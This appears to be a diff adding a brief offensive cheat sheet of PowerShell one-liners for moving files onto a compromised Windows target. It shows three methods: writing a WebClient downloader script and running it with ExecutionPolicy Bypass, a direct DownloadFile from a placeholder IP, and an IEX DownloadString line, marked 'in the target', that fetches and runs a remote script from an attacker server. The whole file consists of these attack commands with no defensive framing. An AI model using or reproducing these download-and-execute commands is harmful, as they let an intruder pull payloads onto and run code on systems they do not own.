@@ -1,0 +1,21 @@
+#1
+
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://xx.xx.xx.xx/xxxxx" >>wget.ps1
+echo $file = "xxxx" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
+#2
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://xx.xx.xx.xx/xxxxx', 'xxxx')
+
+
+#3 transmit a STRING
+#in the server:
+#go.ps1 :
+Write-Output "HAHAHAHAHAHA"
+
+#in the target:
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://xx.xx.xx.xx/go.ps1')
